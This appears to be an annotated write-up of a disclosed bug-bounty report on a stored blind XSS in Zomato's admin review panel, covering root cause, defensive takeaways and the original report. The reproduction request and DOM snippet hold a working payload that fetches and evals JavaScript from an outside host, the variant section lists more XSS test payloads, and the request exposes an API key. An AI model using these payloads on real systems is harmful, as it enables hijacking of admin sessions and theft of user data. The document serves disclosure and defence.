# Blind XSS in Admin Review Panel via Report Additional Details

## Metadata
- **Source:** HackerOne
- **Report:** 314126 | https://hackerone.com/reports/314126
- **Submitted:** 2018-02-09
- **Reporter:** gerben_javado
- **Program:** Zomato
- **Bounty:** Not specified in report
- **Severity:** High
- **Vuln:** Cross-site Scripting (XSS) - Stored, Improper Input Validation, Improper Output Encoding
- **CVEs:** None
- **Category:** web-api

## Summary
A stored XSS vulnerability exists in Zomato's admin review panel where user-submitted 'additional details' in review reports are rendered as HTML without proper sanitization. An attacker can inject malicious JavaScript that executes when admins view the report, allowing unauthorized access to admin panel functions and user data.

## Attack scenario
1. Attacker identifies a review on Zomato and clicks the 'Report Review' functionality in the Zomato Business app
2. In the 'Additional Details' field, attacker submits a blind XSS payload containing a script tag with XMLHttpRequest to load external JavaScript
3. The payload is stored in Zomato's backend database associated with the review report
4. A Zomato admin visits the internal admin panel at /reviews_new?review_id={ID} to review the report
5. The admin panel renders the stored payload without encoding, causing the JavaScript to execute in the admin's browser context
6. The malicious script exfiltrates admin session tokens or data, or makes unauthorized API requests to access other users' private information

## Root cause
The admin panel fails to properly HTML-encode or sanitize user-supplied input from the review report 'additional_text' field before rendering it in the DOM. The presence of 'unsafe-inline' in the CSP policy permits inline script execution, and no Content Security Policy restrictions prevent XMLHttpRequest to external domains.

## Attacker mindset
The attacker recognized that admin review of user reports is a guaranteed read of attacker-controlled content, making it an ideal blind XSS vector. By leveraging XMLHttpRequest with eval() and unsafe-inline CSP, the attacker bypassed basic XSS protections to achieve arbitrary code execution in the admin context.

## Defensive takeaways
- Always HTML-encode user input before rendering in HTML context, regardless of where it appears (user-facing or admin panels)
- Implement strict Content Security Policy without 'unsafe-inline' for scripts; use nonces or hashes for legitimate inline scripts
- Apply input validation to reject or sanitize HTML tags and script content in text fields
- Use a HTML sanitization library (DOMPurify, etc.) when user content must support formatted text
- Implement output encoding at the template/view layer using framework-provided auto-escaping
- Add security headers like X-Content-Type-Options: nosniff to prevent MIME-type sniffing
- Monitor and log access to admin panels; alert on unusual activities from admin accounts

## Variant hunting
Check other user-submitted text fields that admins review (support tickets, appeals, contact forms, feedback)
Test merchant/business owner submitted content rendered in admin dashboards
Verify if other report types (restaurant reports, user reports) have the same vulnerability
Check if the vulnerability exists in different admin pages that display user-generated content
Test SVG-based XSS payloads: <svg onload=alert(1)>
Test event handler attributes: <img src=x onerror=alert(1)>
Test template injection if the backend uses templating engines

## MITRE ATT&CK
- T1190
- T1566.002
- T1566.003
- T1204.001

## Notes
This is a classic blind XSS vulnerability with high impact due to the admin context. The attacker's use of XMLHttpRequest to fetch and eval() external code demonstrates sophistication in bypassing CSP with unsafe-inline. The report shows redacted URLs/user IDs but the vulnerability chain is clear. The bug was verified by the HackerOne triage team. The use of ks.xss.ht suggests the attacker may have been using a blind XSS payload collection service for payload testing.

## Full report
<details><summary>Expand</summary>

#Introduction
In the Zomato Business app there is the functionality to report a review and give additional details as to why you did report the review. Because I knew this reason would be read by Zomato admins I did insert a blind XSS payload here, which ended up executing on https://www.zomato.com████████/reviews_new?review_id={ID}. This means that the content of additional details will be rendered as HTML on the admin panel page. The CSP policy of Zomato can be bypassed by leveraging the unsafe-inline in the CSP to load the JavaScript file using `XMLHttpRequest`.

#Steps to reproduce
1. Replace the `X-Access-Token` to your access token and the `review_id` to a review you can report.
2. Send the request in Burp
3. Go to https://www.zomato.com██████████/reviews_new?review_id={ID}
4. XSS payload executes

```http
POST /v2/█████merchant HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 485
Host: api.zomato.com
X-Zomato-API-Key: a2cf52f6036511e48be6b2227cce2b54
X-Access-Token: dc5da████████ad0fdddff04
X-Client-Id: zomato_merchantandroid_v2

reason_id=5&review_id=32288944&additional_text=<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//ks.xss.ht");a.send();</script>
```

#Screenshot Admin Panel
{█████}

#Dom Snippet
```html
 <u>Reported by Merchant(ID)</u> : <a style="opacity: 1; color: #000000; text-decoration:underline" href="https://www.zomato.com/users/43211589">43211589</a><br><u>Report Reason ID</u> : 5 (Other (mention reason below).)<br><u>Additional Text</u> : H
H
H
H
H
''"&gt;<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//ks.xss.ht");a.send();</script>
```

## Impact

An attacker is certain that a Zomato Admin will read his report. Thus an attacker can be sure that he can gain access to the Zomato admin panel where he can get the private information of other users by leveraging AJAX requests.

The hacker selected the **Cross-site Scripting (XSS) - Stored** weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:

**URL**
https://www.zomato.com██████████/reviews_new

**Verified**
Yes



</details>

---
*Analysed by Claude on 2026-05-24*
